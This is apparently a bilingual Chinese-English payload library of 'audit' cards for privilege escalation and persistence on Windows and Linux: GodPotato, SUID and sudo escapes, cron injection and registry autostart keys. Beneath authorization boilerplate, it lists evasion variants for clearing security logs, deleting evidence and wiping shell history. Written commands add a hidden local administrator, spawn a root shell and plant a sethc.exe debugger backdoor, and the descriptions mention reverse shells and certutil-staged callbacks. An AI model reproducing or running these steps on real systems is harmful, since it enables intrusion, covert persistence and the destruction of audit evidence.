opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 Spooler 状态、补丁和模拟权限，不创建 SYSTEM shell 或输出文件。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：直连反弹免文件

description.zh: 规避点：直接反弹替代落盘输出，减少文件残留。判据：攻击机收到 SYSTEM shell。
description.en: Direct reverse shell instead of file output. Success: SYSTEM shell on the listener.

title.zh: 规避变体：GodPotato 等效路径

description.zh: 规避点：目标补丁封 PrintSpoofer 管道时切换 EfsRpc 路径。判据：pp.txt 为 SYSTEM。
description.en: Switches to EfsRpc when the print pipe is patched. Success: pp.txt shows SYSTEM.

title.zh: 规避变体：无控制台弹窗执行

description.zh: 规避点：避免交互控制台弹窗惊动用户，改文件输出。判据：q.txt 生成且无窗口闪现。
description.en: Avoids the interactive console popup via file output. Success: q.txt created with no visible window.

description.zh: 规避点：删除证据文件并清安全日志。判据：无残留。
description.en: Deletes evidence and clears the security log. Success: nothing remains.

name.zh: GodPotato 适用条件审计

description.zh: GodPotato 适用条件审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: GodPotato Prerequisite Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 GodPotato 适用条件审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for GodPotato Prerequisite Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 GodPotato 适用条件审计场景，检验新系统下基于 DCOM 与 RPC 伪装链的通用提权面。验证维度含即时命令执行与 Base64 编码命令执行两种模式，对应第 1 至第 2 步。
overview.en: This payload covers GodPotato applicability auditing, testing the generic escalation surface via DCOM and RPC impersonation chains on newer systems. Validation covers immediate command execution and Base64-encoded command execution, mapped to steps 1 and 2.

vulnerability.zh: 根因在于系统 RPC 接口的认证属性可被滥用于强制高权限身份回连：只要账户持有 SeImpersonate，GodPotato 即可在 Windows 较新版本上完成通用 SYSTEM 模拟。
vulnerability.en: The root cause is RPC interface authentication properties abusable to force high-privilege callbacks: as long as the account holds SeImpersonate, GodPotato achieves generic SYSTEM impersonation even on recent Windows versions.

exploitation.zh: 第 1 步运行 GodPotato 并以 -cmd 指定 whoami，输出 SYSTEM 即确认提权成立；第 2 步以 Base64 编码命令复测执行链路并留档输出。执行前先用 whoami 加 priv 参数确认 SeImpersonate 特权与系统版本满足适用条件。以 SYSTEM 身份回显为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, run GodPotato with -cmd set to whoami; SYSTEM output confirms escalation. In step 2, retest the execution chain with a Base64-encoded command and archive output. Before execution, confirm SeImpersonate and OS version via whoami plus the priv flag. Judge success by SYSTEM-identity output. Replace placeholders via the global variables menu.

mitigation.zh: 更新系统修补 RPC 认证属性滥用面，回收非必要服务账户的 SeImpersonate，监控本地 RPC 强制认证行为。修复后重放第 1 步，命令应以原身份执行且检测告警触发。
mitigation.en: Patch systems against RPC authentication-property abuse, revoke SeImpersonate from unneeded service accounts, and monitor local RPC forced-authentication behavior. After the fix, replay step 1: commands should run under the original identity with detections firing.

description.zh: 运行 GodPotato 执行 cmd /c whoami；输出 SYSTEM 即确认目标机上 Potato 家族提权路径当前可用，可继续部署完整载荷。
description.en: Run GodPotato with cmd /c whoami; a SYSTEM result confirms the Potato path is live on this host and worth arming with a real payload.

title.en: Prepare the encoded payload and listener

description.zh: 把要常驻执行的命令编码为 Base64 形式，并在本地开启监听确认目标可回连；载荷与通道就绪后进入上线触发环节。
description.en: Base64-encode the stager command and arm the local listener with confirmed egress; with payload and channel ready, trigger the landing step.

title.en: Execute an encoded payload to land

description.zh: 用 -cmd 参数运行 Base64 编码的 PowerShell 命令；以 SYSTEM 身份执行任意编码载荷即完成提权后的权限接管与上线控制。
description.en: Pass a Base64-encoded PowerShell command via -cmd; executing arbitrary encoded payloads as SYSTEM converts the bug into full control of the host.

analysis.zh: GodPotato 适用条件审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: GodPotato Prerequisite Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 RPC/DCOM 版本、补丁和模拟权限，不执行编码命令或高权限进程。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 规避点：同一底层路径换工具实现，规避 GodPotato 特征。判据：SYSTEM 输出。
description.en: Same underlying path, different tool signature. Success: SYSTEM output.

title.zh: 规避变体：本地加组免外联

wafBypass.command: GodPotato.exe -cmd "cmd /c net user eva Pass123! /add && net localgroup administrators eva /add"

description.zh: 规避点：无外联流量直接建立持久账户。判据：eva 进入管理员组。
description.en: No egress traffic; creates a persistent account. Success: eva joins administrators.

title.zh: 规避变体：certutil 中转下载

description.zh: 规避点：HTTPS/certutil 中转，避免工具本体直接外联。判据：x.exe 执行回连。
description.en: Stages via certutil so the potato itself never calls out. Success: x.exe runs and calls back.

description.zh: 规避点：Win10/11 可用的更新实现。判据：n.txt 为 SYSTEM。
description.en: Updated implementation for Win10/11. Success: n.txt shows SYSTEM.

name.zh: SUID 文件权限边界审计

description.zh: SUID 文件权限边界审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: SUID File-Permission Boundary Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 SUID 文件权限边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SUID File-Permission Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 SUID 文件权限边界审计场景，检验 root 属主 SUID 程序的可滥用面。验证维度含全盘定位、常见程序逃逸验证与受限目录枚举三步，对应第 1 至第 3 步。
overview.en: This payload covers SUID file-permission boundary auditing, testing the abusable surface of root-owned SUID programs. Validation covers full-disk discovery, known-escape verification and restricted-directory enumeration, mapped to steps 1 through 3.

vulnerability.zh: 根因在于非常规程序被赋予 SUID 位或管理员对交互式工具授权失当：具备 shell 逃逸能力的 SUID 程序被普通用户调用时直接以 root 执行任意命令。
vulnerability.en: The root cause is unusual binaries carrying the SUID bit or admin misgranting interactive tools: SUID programs with shell escapes execute arbitrary commands as root when invoked by standard users.

exploitation.zh: 第 1 步用 find 全盘定位 SUID 文件，锁定 root 属主且不在基线清单的候选；第 2 步按脚本对 nmap、vim、find 等已知逃逸程序逐一验证，取得 root Shell 即确认对应路径；第 3 步对 usr 目录受限范围再次枚举并输出前 50 项用于交叉核对。以 root 身份回显为成功判据。占位符在全局变量菜单替换；测试 Shell 仅执行只读命令。
exploitation.en: In step 1, locate SUID files disk-wide with find, locking onto root-owned candidates absent from the baseline list. In step 2, verify known escapes for nmap, vim and find per the script; a root shell confirms the corresponding path. In step 3, re-enumerate within usr directories and print the first 50 entries for cross-checking. Judge success by root-identity output. Replace placeholders via the global variables menu; run read-only commands in test shells.

mitigation.zh: 移除非必要 SUID 位并以基线比对监控变更，用 nosuid 挂载用户可写分区。修复后重放第 1、2 步，异常位应消失且逃逸尝试失败。
mitigation.en: Strip unneeded SUID bits, monitor changes against a baseline, and mount user-writable partitions nosuid. After the fix, replay steps 1 and 2: stray bits should be gone and escapes fail.

title.zh: 全盘枚举 SUID 文件

description.zh: 用 find 按 -perm -4000 扫描全盘可执行文件；输出 root 属主且非常规路径的 SUID 程序清单即锁定提权候选集合。
description.en: Scan the filesystem with find -perm -4000; root-owned SUID binaries outside the usual directories form the escalation shortlist.

title.en: Refine the hunt in standard directories

description.zh: 限定 /usr/bin 与 /usr/local/bin 精确列出 SUID 二进制；逐条与 GTFOBins 匹配圈定带已知利用方式的程序，缩小攻击面。
description.en: List SUID binaries precisely under /usr/bin and /usr/local/bin and match each against GTFOBins; known-abusable programs shrink the target list.

title.zh: 利用 SUID 逃逸拿 root shell
title.en: Escape to a root shell via SUID

description.zh: 对候选程序运行 nmap 交互模式、vim 的 bang 命令、find 的 exec 参数等已知逃逸语法；获得 euid 为 root 的 shell 即完成提权。
description.en: Fire known escapes such as nmap interactive, vim :! and find -exec against the shortlist; a shell with euid=root completes the escalation.

analysis.zh: SUID 文件权限边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: SUID File-Permission Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 在限定系统目录列出 SUID 文件、所有者和哈希，并与批准基线比较，不使用 shell escape。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 规避点：限定目录替代全盘扫描，减少 auditd 规则命中。判据：枚举结果正常返回。
description.en: Scopes the scan to reduce auditd hits. Success: enumeration returns normally.

title.zh: 规避变体：解释器提权替代

description.zh: 规避点：SUID python 路径替代 find/vim 等高频告警二进制。判据：得到 root shell。
description.en: Uses a SUID python instead of noisy find/vim paths. Success: root shell.

title.zh: 规避变体：perl 提权路径

description.zh: 规避点：SUID perl 变体扩大绕过面。判据：euid 为 0。
description.en: SUID perl variant widens coverage. Success: euid 0.

title.zh: 规避变体：无痕 shell 环境

wafBypass.command:
exec /bin/sh -p
unset HISTFILE HISTSIZE; export HISTSIZE=0; history -c

description.zh: 规避点：exec 替换进程避免父子树检测并清历史。判据：无 history 记录且 shell 可用。
description.en: exec replaces the process tree and clears history. Success: shell works with no history records.

name.zh: Sudoers 最小权限审计

description.zh: Sudoers 最小权限审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Sudoers Least-Privilege Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Sudoers 最小权限审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Sudoers Least-Privilege Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Sudoers 最小权限审计场景，检验当前用户 NOPASSWD 授权项的可滥用逃逸面。验证维度含授权枚举、常见程序逃逸与非交互核对三步，对应第 1 至第 3 步。
overview.en: This payload covers sudoers least-privilege auditing, testing escape surfaces of the current user's NOPASSWD grants. Validation covers grant enumeration, common-program escapes and non-interactive verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 sudoers 为编辑器、查找类工具授予无限制 root 权限：这类程序自带 shell 逃逸，用户免密即可获得完整 root 会话，最小权限原则失效。
vulnerability.en: The root cause is sudoers granting unrestricted root to editors and search-class tools with built-in shell escapes: users get a full root session passwordlessly, voiding least privilege.

exploitation.zh: 第 1 步以 sudo -l 列出当前授权，锁定 NOPASSWD 条目；第 2 步按脚本对 vim、find、awk 等授权程序逐一执行已知逃逸，取得 root Shell 即确认对应路径；第 3 步以 sudo -n -l 非交互模式复核清单以支撑自动化巡检。以 root 身份回显为成功判据。占位符在全局变量菜单替换；逃逸验证仅执行 id 等只读命令。
exploitation.en: In step 1, list current grants with sudo -l and lock onto NOPASSWD entries. In step 2, run known escapes for authorized programs such as vim, find and awk per the script; a root shell confirms the path. In step 3, recheck the list non-interactively with sudo -n -l to support automated audits. Judge success by root-identity output. Replace placeholders via the global variables menu; run read-only commands like id during escape verification.

mitigation.zh: sudoers 收敛为参数白名单并禁止编辑器类全权授权，启用 sudo 日志与会话录制。修复后重放第 2 步，逃逸命令应被拒绝且日志可追溯。
mitigation.en: Narrow sudoers to argument allowlists, forbid blanket editor-class grants, and enable sudo logging with session recording. After the fix, replay step 2: escape attempts should be denied with traceable logs.

description.zh: 用 sudo -l 列出当前用户全部授权；出现 root 且 NOPASSWD 的命令即锁定可滥用的提权入口，重点关注带通配符或编辑器的条目。
description.en: List grants with sudo -l; root NOPASSWD entries mark the abusable escalation doors, especially wildcards and editors.

description.zh: 用 sudo -n -l 在脚本环境复核免密授权清单；输出完整命令与参数限制即可判断是否存在参数注入或 shell 逃逸空间。
description.en: Re-check with sudo -n -l inside scripts; the full command and argument constraints reveal room for argument injection or shell escapes.

description.zh: 对 vim、find、awk 等授权程序运行已知逃逸语法；获得 root shell 即完成 sudo 提权闭环，可继续横向或读取敏感文件。
description.en: Run known escapes against granted vim, find and awk; a root shell closes the sudo escalation loop for further movement.

analysis.zh: Sudoers 最小权限审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Sudoers Least-Privilege Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 读取专用实验账号的 sudo -l 与 sudoers 片段，核对命令、参数和环境约束，不启动 shell。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：CVE-2019-14287 用户号绕过

description.zh: 规避点：sudo<1.8.28 以 #uid=-1 语法绕过用户白名单。判据：直接得到 root shell。
description.en: Exploits the -1 uid parsing to bypass allowlists on old sudo. Success: root shell.

title.zh: 规避变体：env 链式提权

description.zh: 规避点：sudoers 授权 env 时以环境执行器转 shell，命令行无 vim/find 特征。判据：root shell。
description.en: env is allowed, spawns a shell without classic GTFOBins signatures. Success: root shell.

title.zh: 规避变体：less 读密 + shell

description.zh: 规避点：以阅读密文件为掩护进入 pager 后执行 !sh。判据：显示哈希并得到 shell。
description.en: Reading shadow as cover, then !sh inside the pager. Success: hashes shown and shell obtained.

title.zh: 规避变体：静默授权探测

description.zh: 规避点：-n 免密码提示、管道过滤减少输出曝光。判据：列出可免密命令。
description.en: Non-interactive probe with filtered output. Success: passwordless commands listed.

name.zh: Cron 所有权与可写路径审计

description.zh: Cron 所有权与可写路径审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Cron Ownership and Writable-Path Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Cron 所有权与可写路径审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Cron Ownership and Writable-Path Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Cron 所有权与可写路径提权审计场景，检验 root 计划任务对可写脚本与归档钩子的执行边界。验证维度含任务清单核查、脚本权限检查与 tar checkpoint 钩子验证三步，对应第 1 至第 3 步。
overview.en: This payload covers cron ownership and writable-path escalation auditing, testing how root-scheduled jobs handle writable scripts and archive hooks. Validation covers task-list review, script-permission checks and a tar checkpoint-hook verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 root 计划任务引用的脚本或其父目录对普通用户可写，或以通配方式处理文件名：攻击者注入命令或借 tar 参数展开即让任务以 root 执行任意代码。
vulnerability.en: The root cause is root cron jobs referencing scripts or parent directories writable by standard users, or expanding filenames via wildcards: injected commands or tar argument expansion let the job run attacker code as root.

exploitation.zh: 第 1 步查看 etc 下 crontab 与计划任务目录，锁定 root 运行且路径可写的任务；第 2 步检查目标脚本及其父目录权限，普通用户可写即确认注入点；第 3 步在测试目录用 tar checkpoint 钩子执行夹具脚本，验证通配参数注入的可达性。以 root 上下文执行痕迹为成功判据。占位符在全局变量菜单替换；钩子测试仅在隔离目录进行。
exploitation.en: In step 1, review the etc crontab and scheduled-task directories, locking onto root-run jobs with writable paths. In step 2, check target-script and parent-directory permissions; standard-user writability marks the injection point. In step 3, use a tar checkpoint hook to execute a fixture script in a test directory, validating wildcard argument-injection reachability. Judge success by root-context execution traces. Replace placeholders via the global variables menu; run hook tests only in isolated directories.

mitigation.zh: 任务脚本与父目录仅允许 root 写入，避免通配调用并显式列出文件，cron 编辑与执行纳入审计。修复后重放第 2、3 步，写入应被拒绝且钩子不再触发。
mitigation.en: Restrict job scripts and parent directories to root writes, avoid wildcard invocations by listing files explicitly, and audit cron edits and runs. After the fix, replay steps 2 and 3: writes should be denied and hooks never fire.

description.zh: 读取 crontab 与各 cron 目录内容；由 root 周期运行且脚本路径可写的任务即锁定命令注入点，记录调度间隔评估等待时间。
description.en: Read crontab and the cron directories; root-scheduled jobs with writable script paths become injection points, with intervals hinting at wait time.

title.zh: 检查脚本与目录写权限
title.en: Check script and directory write access

description.zh: 查看任务脚本及其父目录的权限细节；普通用户具备写权限即可向脚本追加命令，等待下个调度周期以 root 身份执行。
description.en: Inspect the job script and its parent directory; ordinary-user write access means appended commands run as root on the next cycle.

description.zh: 以 tar 的 checkpoint-action 钩子在归档创建时执行指定脚本；钩子被触发即验证通配符注入路径可达，可将同法写入 cron 脚本实现提权。
description.en: Use tar's --checkpoint-action hook to execute a script during archive creation; the hook firing proves wildcard injection works and the same trick escalates via cron.

analysis.zh: Cron 所有权与可写路径审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Cron Ownership and Writable-Path Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只检查固定 cron 文件和脚本的所有者、权限与路径，不创建 checkpoint 或执行命令。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 规避变体：通配符注入提权

description.zh: 规避点：tar 通配符注入不修改 cron 定义本身，绕过 crontab 监控。判据：收到 root shell。
description.en: Wildcard injection never touches the cron definition. Success: root shell arrives.

description.zh: 规避点：覆盖 cron 脚本调用的无路径命令，不改脚本本体。判据：定时触发回连。
description.en: Shadows an unqualified command instead of editing the script. Success: scheduled callback.

title.zh: 规避变体：cron.d 注入持久化

description.zh: 规避点：独立文件持久化不篡改既有 crontab，降低 diff 告警。判据：每分钟以 root 执行 /tmp/x。
description.en: A separate file avoids modifying existing crontabs. Success: /tmp/x runs as root every minute.

description.zh: 规避点：删除载荷与注入项并清历史。判据：相关文件与条目全部消失。
description.en: Removes payloads, injected entries, and history. Success: all artifacts gone.

name.zh: 注册表启动项持久化审计

description.zh: 注册表启动项持久化审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Registry Startup Persistence Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 注册表启动项持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Registry Startup Persistence Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖注册表启动项持久化的植入与审计场景，检验 Run、RunOnce、Winlogon 与服务键的自启行为及检测面。验证维度含四类注册表持久化机制的写入与回读对照，对应第 1 至第 4 步。
overview.en: This payload covers registry run-key persistence implantation and auditing, testing autostart behavior and detection surface across Run, RunOnce, Winlogon and service keys. Validation writes and reads back four registry persistence mechanisms, mapped to steps 1 through 4.

vulnerability.zh: 根因在于自启注册表键对高权限进程可写且默认无完整性基线校验：恶意值混入 Run 或 Userinit 后随登录执行，常规巡检如未覆盖这些键即长期驻留。
vulnerability.en: The root cause is autostart registry keys writable by high-privilege processes with no integrity baseline by default: once malicious values slip into Run or Userinit they execute at logon and persist whenever routine checks miss those keys.

exploitation.zh: 第 1 步写入 HKLM Run 键并回读，重启后命令执行即确认自启；第 2 步写入 RunOnce 验证一次性触发后键被删除；第 3 步向 Userinit 追加路径，登录时随 userinit 执行即确认劫持；第 4 步用 sc create 建自启服务并以 qc 核对。以回读值与执行痕迹为判据。占位符在全局变量菜单替换；测试后立即清除。
exploitation.en: In step 1, write the HKLM Run key and read it back; execution after reboot confirms autostart. In step 2, write RunOnce verifying one-shot triggering and key deletion. In step 3, append to Userinit; execution alongside userinit at logon confirms the hijack. In step 4, create an autostart service with sc create checked via qc. Judge by read-back values and execution traces. Replace placeholders via the global variables menu; clean up immediately after testing.

mitigation.zh: 为自启键建立配置基线并监控修改事件（Sysmon 12、13），限制非授权进程写入 HKLM 运行键。修复后重放第 1 至第 4 步，全部写入应触发实时告警并可在基线比对中定位。
mitigation.en: Baseline autostart keys and alert on modification events (Sysmon 12 and 13), blocking unauthorized processes from writing HKLM run keys. After the fix, replay steps 1 through 4: every write should trigger real-time alerts and stand out in baseline diffs.

title.zh: 写入 Run 键开机自启

description.zh: 用 reg add 向 HKLM 的 Run 键写入后门程序路径；回读键值成功且重启后命令执行即建立最直接的开机持久化通道。
description.en: Write the backdoor path into HKLM's Run key with reg add; a successful readback plus execution after reboot establishes boot persistence.

title.zh: 借 RunOnce 实现单次触发

description.zh: 向 RunOnce 键写入载荷路径；下次登录执行一次后键值自动删除，比 Run 键留下更短的取证痕迹，适合一次性载荷落地。
description.en: Write the payload into RunOnce; it fires on next logon and the value self-deletes, leaving a shorter forensic trail for one-shot payloads.

description.zh: 在 Userinit 值末尾追加后门路径；用户登录时随 userinit 一并启动，回读包含追加项即确认登录链持久化生效且不易被察觉。
description.en: Append the backdoor path to the Userinit value; it launches alongside userinit at every logon, a stealthier persistence hook that survives reboots.

description.zh: 用 sc create 注册 AUTO_START 服务指向后门程序；qc 回读显示自动启动且开机执行即获得比注册表更稳定的系统级持久化通道。
description.en: Create an AUTO_START service with sc create pointing at the backdoor; auto-start confirmed by sc qc yields a steadier system-level persistence than registry keys.

analysis.zh: 注册表启动项持久化审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Registry Startup Persistence Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 只读取 Run、RunOnce 和 Winlogon 等批准位置并核对签名与基线，不写入注册表。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 规避 reg.exe 命令行审计：PowerShell 注册表提供程序写 Run 键；键值查询回显即驻留生效。
description.en: Write the Run key via the PowerShell registry provider to avoid reg.exe command-line auditing; the value echoing on query confirms persistence.

description.zh: 以 RunOnce 替代 Run 降低常规自启清单命中率；重启后执行并自清键即成功。
description.en: Use RunOnce instead of Run to fall outside routine autostart inventories; execution after reboot with the key self-clearing confirms success.

wafBypass.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Users\Public\backdoor.exe"

description.zh: 绕过对 Run/RunOnce 键的专门监控：劫持辅助程序调试器键实现触发；连按五次 Shift 拉起程序即成功。
description.en: Hijack an accessibility binary's debugger key to sidestep Run-key-specific monitoring; the program launching via the trigger confirms success.

description.zh: 绕过 HKLM 域级审计：HKCU 登录脚本键在用户上下文静默执行；登录后进程出现即成功。
description.en: Persist via the HKCU logon-script key outside HKLM domain auditing; the process appearing after logon confirms success.

name.zh: WMI 永久事件订阅审计

description.zh: WMI 永久事件订阅审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: WMI Permanent Event-Subscription Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 WMI 永久事件订阅审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for WMI Permanent Event-Subscription Audit are authorized in writing and reversible.

